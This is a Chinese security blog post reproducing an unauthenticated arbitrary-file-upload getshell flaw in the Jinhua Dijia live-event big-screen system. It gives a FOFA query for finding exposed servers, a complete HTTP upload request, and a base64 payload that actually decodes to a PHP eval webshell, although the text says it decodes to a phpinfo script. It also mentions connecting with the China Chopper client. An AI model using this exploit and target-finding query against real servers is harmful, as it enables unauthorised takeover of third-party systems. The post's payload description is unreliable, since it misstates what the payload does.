#  【漏洞复现】金华迪加现场大屏系统存在任意文件上传getshell漏洞   
原创 清风  白帽攻防   2024-12-05 01:07  
  
## 免责声明：请勿使用本文中提到的技术进行非法测试或行为。使用本文中提供的信息或工具所造成的任何后果和损失由使用者自行承担，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
简介  
  
  
金华迪加现场大屏互动系统是一种创新的互动展示解决方案，融合了先进的技术与创意设计，旨在通过大屏幕与多种交互方式，打造沉浸式的观众体验。该系统广泛应用于各类活动、展览、会议等场所，能够有效提升现场氛围，增加参与感与互动性。金华迪加网络科技有限公司专注于现场互动系统平台的开发与优化，其主打产品——现场活动大屏幕系统，旨在为各类合作企业提供技术支持，提升活动的互动性和影响力。  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0cNxox3UJZdpKE5A5TyibLhoicjRF64zwPr7CSomCaUNm0Sm4Z7nticKUHjiaqWQvUWCMY8vDxTXYV9Vg/640?wx_fmt=png&from=appmsg "")  
漏洞描述  
  
  
  
金华迪加现场大屏互动系统中的mobile.do.php接口存在任意文件上传漏洞，攻击者可以未经身份验证利用该漏洞上传恶意文件（如WebShell），并执行任意代码，从而获取服务器的控制权限。  
fofa语法```
body="/wall/themes/meepo/assets/images/defaultbg.jpg" || title="现场活动大屏幕系统"
```  
漏洞复现```
POST /mobile/mobile.do.php?action=msg_uploadimg HTTP/2
Host: IP
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

filetype=php&imgbase64=PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4=
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0cNxox3UJZdpKE5A5TyibLhoLYpjN6Ju733sw2rPVyHBIlBc5laIcgSceQ1rjhWfmicLSwiarrPVPdhA/640?wx_fmt=png&from=appmsg "")  
  
```
PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4=  base64解码  <?php phpinfo();unlink(__FILE__);?>
访问上传的文件  https://IP/data/pic/pic_173314975432370.php
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0cNxox3UJZdpKE5A5TyibLhoY5ZDhqHURcicVsw0cXhMmcnpibYGvjibTLacsdnL3QWwgxn6RaoehPicyw/640?wx_fmt=png&from=appmsg "")  
  
```
上传shell，菜刀连接木马（详情见知识星球）
```  
  
  
批量检测（批量检测POC工具请在公众号知识星球获取）：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0cNxox3UJZdpKE5A5TyibLho44PXav8b0ORA6WY3WbIpdxWiaQzb7iaLasFytuODAapsoQ4sKW96Re1g/640?wx_fmt=png&from=appmsg "")  
修复建议  
打补丁  
  
  
  
  
  
  
  
  
网安交流群  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/yu6trpdUX0efFOzibVic3qjn100tFgpUIh7ib8g9cKajewKFM5kXP350q21SCLvlgO6yx1tlia8VYxI4j3cv57FqFg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
